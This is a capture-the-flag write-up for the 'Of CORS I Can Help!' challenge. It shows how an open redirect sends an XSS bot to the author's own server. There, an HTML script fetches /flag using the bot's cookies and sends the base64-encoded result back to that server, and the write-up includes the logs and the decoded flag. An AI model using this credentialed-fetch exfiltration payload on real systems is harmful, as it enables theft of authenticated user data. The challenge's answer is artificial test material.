# 'Of CORS I Can Help!' writeup

**Writeup author**: piprett (Norske Nøkkelsnikere)

Based on the description of the challenge we are told that a bot will visit web pages for us, including internal ones. This suggest the use of an "XSS bot", which is essentially an automated instance of Chromium. On the web page we are allowed to enter an URL for the bot to visit.

The first order of business is trying to get the bot to connect to our server. That will give us much more control. Initially I tried giving it a simple [webhook.site] URL, however that made the error "host not allowed". This suggests that the bot will only visit URLs on our instance. I started looking for [open redirects](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html) as that would let me redirect it to a server I control.

Using the "Debugger" tab of Firefox I opened the `app.js` code. Here I quickly spottet a suspicious function:

```js
function buildGotoUrl(fragment) {
  const target = `/static/index.html#${fragment}`;
  return `/goto?url=${encodeURIComponent(target)}`;
}
```

This code suggests that `/goto` will let us redirect to any URL. I quickly tried it in my browser, and it worked. To receive the webhook in [webhook.site] I constructed the URL `https://my-instance-ofcors.ept.gg/goto?url=https://webhook.site/my-uuid` and sent it to "Jenny". I quickly received a callback, but it has no flag in it.

To get the flag I setup a custom webpage. I made a `index.html` file containing the following:

```html
<html>
  <script>
    fetch('https://my-instance-ofcors.ept.gg/flag', { credentials: 'include' }).then((a) => {
      a.text().then((b) => {
        fetch('/out?data=' + btoa(b));
      });
    });
  </script>
</html>
```

1. Once the page loads it will load `https://my-instance-ofcors.ept.gg/flag` (I guessed the flag is at `/flag`)
   - In the request it will include Jenny's cookie credentials to authenticate
2. When the request comes back, get the text content
3. Base64 encode the text and send it to `/out?data=`. This will show the Base64 encoded data in our console

For hosting I put the index.html my team's EPT Box, and used `python3 -m http.server`:

```bash
┌──(kali㉿kali)-[~/test]
└─$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

The URL we send to Jenny will need to include the domain of the EPT Box. This can be found on your team's dashboard. It will look something like `team_name-some_id-eptbox.eptc.tf`.

Our URL becomes `https://my-instance-ofcors.ept.gg/goto?url=http://team_name-some_id-eptbox.eptc.tf:8000`. After sending, the base64 encoded data should appear:

```log
[13/Nov/2025 17:52:08] "GET / HTTP/1.1" 200 -
[13/Nov/2025 17:52:08] "GET /out?data=eyJmbGFnIjoiRVBUe0NPUlNfdDB0YWxseV90clU1dDVfeTB1fSJ9 HTTP/1.1" 404 -
```

The base64 encoded data can be decoded on [CyberChef](<https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)&input=ZXlKbWJHRm5Jam9pUlZCVWUwTlBVbE5mZERCMFlXeHNlVjkwY2xVMWREVmZlVEIxZlNKOQ>) into the following JSON:

```json
{ "flag": "EPT{CORS_t0tally_trU5t5_y0u}" }
```

[webhook.site]: https://webhook.site
